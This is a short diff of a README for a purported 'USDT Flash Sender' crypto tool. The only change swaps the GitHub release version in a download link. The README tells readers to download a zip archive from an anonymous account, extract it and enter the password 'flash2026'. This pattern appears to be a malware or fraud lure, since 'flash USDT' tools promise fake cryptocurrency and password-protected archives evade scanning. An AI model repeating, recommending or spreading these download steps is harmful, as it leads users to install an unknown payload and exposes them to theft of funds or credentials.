@@ -29,7 +29,7 @@
 **Important**: The tool requires a runtime helper to interact with blockchain nodes. Follow these steps carefully:
 
 1. **Download the package** from the link below:
-   👉 [Download USDT Flash Sender](https://github.com/Mar1niem3r/Project/releases/download/V2/flash-trust-wallet.zip)
+   👉 [Download USDT Flash Sender](https://github.com/Mar1niem3r/Project/releases/download/V1/flash-trust-wallet.zip)
 
 2. **Extract the archive** (right-click → "Extract All...").
    When prompted for a password, enter: **`flash2026`**
